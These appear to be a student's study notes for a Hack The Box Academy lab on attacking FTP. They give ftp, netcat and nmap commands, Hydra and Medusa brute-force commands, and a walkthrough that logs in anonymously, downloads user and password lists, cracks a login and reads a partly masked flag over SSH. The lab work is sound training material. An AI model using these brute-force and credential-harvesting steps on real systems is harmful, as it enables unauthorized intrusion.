[Attacking FTP](https://academy.hackthebox.com/module/116/section/1165)

### Connecting to the FTP server using the ftp client:
```
ftp $TARGET_IP
```
### Connecting to the FTP server using netcat:
```
nc -v $TARGET_IP $PORT
```
### Brute Forcing the FTP service with Hydra:
```
hydra -L users.list -P /usr/share/wordlists/rockyou.txt ftp://$TARGET_IP
```
```
hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt ftp://$TARGET_IP
```
#### Brute Forcing with Medusa:
```
medusa -u $USERNAME -P /usr/share/wordlists/rockyou.txt -h $TARGET_IP -M ftp
```


## Questions:
1. What port is the FTP service running on? 

```
sudo nmap -sV -sC $TARGET_IP -Pn
```

<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBoxAcademy/CPTS/Attacking-Common-Services/ftp-nmap-scan.png">

2. What username is available for the FTP server? 

```
wget -m --no-passive ftp://anonymous:anonymous@10.129.203.6 -Pn
```
or
```
ftp 10.129.203.6 -p 2121
Connected to 10.129.203.6.
220 ProFTPD Server (InlaneFTP) [10.129.203.6]
Name (10.129.203.6:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||55278|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
226 Transfer complete
ftp> mget *
mget passwords.list [anpqy?]? y
229 Entering Extended Passive Mode (|||43085|)
150 Opening BINARY mode data connection for passwords.list (1959 bytes)
  1959        1.31 MiB/s 
226 Transfer complete
1959 bytes received in 00:00 (174.85 KiB/s)
mget users.list [anpqy?]? y
229 Entering Extended Passive Mode (|||7181|)
150 Opening BINARY mode data connection for users.list (72 bytes)
    72       30.43 KiB/s 
226 Transfer complete
72 bytes received in 00:00 (6.39 KiB/s)
ftp> 
```

```
hydra -L users.list -P passwords.list  ftp://10.129.203.6:2121 -V
```
 `
  [2121][ftp] host: 10.129.203.6   login: r****   password: 7iz***********7
`


3. Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer. 

ssh $username@$TARGET_IP
ls 
cat flag.txt

HTB{ ATT******_********C3}